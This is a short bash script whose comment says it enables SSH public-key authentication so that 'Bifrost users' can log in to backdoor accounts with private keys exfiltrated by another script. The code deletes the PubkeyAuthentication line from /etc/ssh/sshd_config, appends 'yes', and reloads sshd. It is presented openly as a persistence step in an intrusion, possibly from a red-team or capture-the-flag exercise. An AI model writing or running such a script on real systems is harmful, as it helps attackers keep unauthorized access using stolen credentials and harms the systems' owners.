#!/bin/bash
#
# Script that changes the PubkeyAuthentication
# settin in sshd_config to allow Bifrost users
# to login to backdoor accounts using exfiltrated
# private keys from the bingus script.
#

file="/etc/ssh/sshd_config"
setting="PubkeyAuthentication"
/usr/bin/sed -i '/^'"${setting}"'/d' ${file}
/usr/bin/echo "${setting} yes" >> ${file}
/usr/bin/systemctl reload sshd.service
